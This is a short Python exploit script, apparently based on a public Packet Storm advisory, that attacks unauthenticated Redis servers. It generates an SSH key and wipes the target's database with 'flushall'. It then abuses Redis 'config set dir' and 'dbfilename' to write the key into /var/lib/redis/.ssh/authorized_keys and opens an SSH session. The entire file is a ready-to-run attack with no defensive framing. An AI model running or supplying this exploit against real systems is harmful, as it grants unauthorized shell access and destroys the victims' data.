#!/usr/bin/env python

# Based on https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html


import os
import os.path
from sys import argv

username = argv[1]
ip = argv[2]


print('Username: ' + username)
print('IP: ' + ip)

def ssh_conn():
   print('Connecting through SSH')
   shell = "ssh -i " + '$HOME/.ssh/id_rsa ' + username + "@" + ip
   os.system(shell)

def exploit():
   if os.path.isfile('/usr/bin/redis-cli') or os.path.isfile('/usr/local/bin/redis-cli'):
      try:
         command = 'redis-cli -h '
         print('Echoing rsa into foo.txt')
         os.system('(echo -e "\n\n";cat /$HOME/.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt')

         print("Deleting all keys from the database of " + ip)
         os.system('redis-cli -h ' + ip + ' flushall')
         print("writing our rsa inside the memory of Redis")
         os.system('cat foo.txt | redis-cli -h ' + ip + ' -x set crackit')

         print("Dumping all our memory content into authorized_keys file")
         # os.system(command  + ip )
         os.system(command  + ip + ' config set dir /var/lib/redis/.ssh/')
         # os.system(command  + ip + ' get dir')
         os.system(command  + ip + ' config set dbfilename "authorized_keys"')
         os.system(command  + ip + ' save')

         ssh_conn()
         
      except:
         print('Error in exploiting with redis-cli')
   else:
      print ('You need Redis-cli in your system')



def makeKey():
   if os.path.exists('/usr/bin/ssh-keygen') or os.path.exists('/usr/local/bin/ssh-keygen'):
      try:
         print('Generating a new SSH key')
         os.system('ssh-keygen -t rsa -C "crack@redis.io"')

      except:
         print('Error in generating key')
   else:
      print('You need ssh-keygen')

# main execution goes here

makeKey()

exploit()



